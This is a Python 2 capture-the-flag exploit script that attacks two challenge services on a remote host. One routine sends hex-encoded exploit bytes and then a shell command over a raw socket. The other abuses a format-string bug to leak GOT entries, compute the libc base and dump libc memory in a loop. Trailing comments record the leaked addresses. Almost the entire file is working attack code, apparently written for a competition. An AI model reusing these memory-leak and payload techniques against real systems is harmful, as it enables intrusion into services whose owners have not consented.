__author__ = 'HuyNA'

"""
    The Heart Still Bleed

FILE
Target: 23.98.66.138:3333
"""

import os
import socket
import time
import struct
import sys
import base64
def pwn150():
    HOST = '23.98.66.138'    # The remote host
    PORT = 4444              # The same port as used by the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    # send exploit code
    s.sendall("10000000".decode('hex'))
    s.sendall("1e00000000000000B206400000000000".decode('hex'))

    s.sendall("ls -l /lib/x86_64-linux-gnu \n")
    while 1:
        data = s.recv(1024)
        if len(data) == 0:
            break
        print data

    s.close()
#pwn150()
"""
Pwn3

BINARY
Target: 23.98.66.138 5555
"""
HOST = '23.98.66.138'    # The remote host
PORT = 5555              # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# send exploit code
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

def de_qui(address_dump):
    address_dump_string = struct.pack("<I",address_dump)
    format_string_1 = "%s"+'\x00'*14+address_dump_string+address_dump_string
    data_send = format_string_1
    s.send(data_send)
    time.sleep(0.01)
def dump_mem(address_dump):
    address_dump_string = struct.pack("<I",address_dump)
    format_string_1 = "%s"+'\x00'*14+address_dump_string
    data_send = format_string_1
    s.send(data_send)
    time.sleep(0.01)
    data1 = s.recv(16)
    print data1.encode('hex')
    return data1

snprint_address = 0x0804A030
read_address = 0x0804A00C

main_function_address = 0x0804866C
string_address = struct.pack("<I",0x08048870)

def test():
    data2 = dump_mem(read_address)
    libc_read_address = struct.unpack('<I',data2[0:4])[0]
    print 'read_address: ','\t',hex(libc_read_address)
    libc_read_address = libc_read_address  - 0xD9F80
    print 'libc_base_address: ','\t',hex(libc_read_address)

    data2 = dump_mem(snprint_address)
    snprintf_address = struct.unpack('<I',data2[0:4])[0]
    print 'snprintf_address: ','\t',hex(snprintf_address)
    print 'delta: ','\t',hex(snprintf_address-libc_read_address)

snprint_delta = 0x4cec0

print recv_until(s, 'Pwn: 250\n')
data1 = s.recv(16)
print data1.encode('hex')
time.sleep(1)

data2 = dump_mem(read_address)
libc_read_address = struct.unpack('<I',data2[0:4])[0]
print 'read_address: ','\t',hex(libc_read_address)
libc_read_address = libc_read_address  - 0xD9F80
print 'libc_base_address: ','\t',hex(libc_read_address)
for i in range(5000,6000):
    #[+] Call de quy main
    time.sleep(0.1)
    de_qui(main_function_address)
    #[+] Recv Welcome Message
    time.sleep(0.1)
    print recv_until(s, 'Pwn: 250\n')
    data1 = s.recv(16)
    print data1.encode('hex')
    #[+] dump mem tuong ung
    a = i*0x10+libc_read_address+0x39000
    print hex(a),'\t',
    data2 = dump_mem(a)


# c0de5ef7000000000000000000000000

#800f66f7 c0db5ff7 b0826bf7 26840400
#805f61f7 c02b5bf7 b0d266f7 26840400
#				302666f7 46840408 705960f7 31313100
# F7660F80 F75FDBC0			F7587000
# 	      76BC0

# F7615F80 F75B2BC0

